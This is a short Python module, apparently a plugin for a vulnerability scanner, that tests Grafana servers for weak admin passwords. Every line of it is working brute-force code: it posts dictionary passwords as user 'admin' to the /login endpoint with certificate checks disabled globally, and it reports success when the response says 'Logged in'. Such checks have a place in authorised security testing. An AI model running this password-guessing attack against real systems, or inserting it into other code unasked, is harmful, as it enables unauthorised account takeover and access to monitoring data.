from exp.lib.gla import getpassdict
from urllib import request
from urllib import parse
from urllib.request import urlopen
import ssl

ssl._create_default_https_context = ssl._create_unverified_context


def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    testurl = url + '/login'
    print('testing if grafan weak pass vul')
    header={
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36',
    'ContentType': 'application/x-www-form-urlencoded; chartset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.8',
    'Connection': 'close'
    }
    passdictarr = getpassdict()
    psw = passdictarr.get_pass_dict()
    psw.append('grafan')
    for password in psw:
        data={"user":"admin","email":"","password":password}
        data = parse.urlencode(data).encode('utf-8')
        ret = request.Request(url=testurl,data=data,headers=header)
        try:
            res=urlopen(ret,timeout=3)
            if b"Logged in" in res.read():
                msg = 'There is grafan unanth vul on url: ' +url+ ' .'
                print(msg)
                number = 'v73'
                return True,url,number,msg
            else:
                pass
        except Exception as e:
            msg = str(e)
            print(msg)
            pass
    msg = 'There is no grafan unanth vul'
    number = 'v0'
    return False,url,number,msg